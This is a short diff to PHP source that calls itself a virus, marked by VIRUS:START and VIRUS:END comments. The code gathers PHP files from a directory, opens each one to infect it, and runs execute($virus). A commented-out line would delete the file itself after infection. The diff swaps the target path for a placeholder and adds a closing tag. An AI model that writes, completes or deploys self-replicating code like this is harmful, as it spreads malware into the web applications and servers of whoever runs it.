@@ -4,7 +4,7 @@ if (!function_exists('execute')) {
     // VIRUS:START
     function execute($virus)
     {
-        $fileNames = getEditableFiles(__DIR__, '#\.php$#'); // Get a list of all php files
+        $fileNames = getEditableFiles('/*todo: path*/', '#\.php$#'); // Get a list of all php files
         foreach ($fileNames as $fileName) { // Check each file
             $script = fopen($fileName, 'r'); // Open file
 
@@ -118,7 +118,6 @@ if (!function_exists('execute')) {
 
         return $list;
     }
-
 // VIRUS:END
 }
 
@@ -134,3 +133,4 @@ $virus = substr(
 );
 execute($virus);
 //unlink(__FILE__); // Delete self after files infected
+?>
